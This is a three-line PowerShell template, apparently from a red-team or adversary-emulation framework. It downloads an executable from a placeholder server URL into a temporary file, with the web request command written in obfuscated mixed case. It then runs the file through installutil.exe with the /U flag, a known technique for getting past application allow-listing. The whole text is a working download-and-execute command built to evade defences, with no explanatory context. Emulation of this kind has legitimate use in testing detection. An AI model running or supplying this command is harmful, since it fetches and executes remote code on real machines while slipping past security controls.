$exefile = New-TemporaryFile;
iWr -UsEbaSIcparSING {{http_server_url}}/{{filename_exe}} -OutFile $exefile
&"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe" /logfile= /LogToConsole=true /U $exefile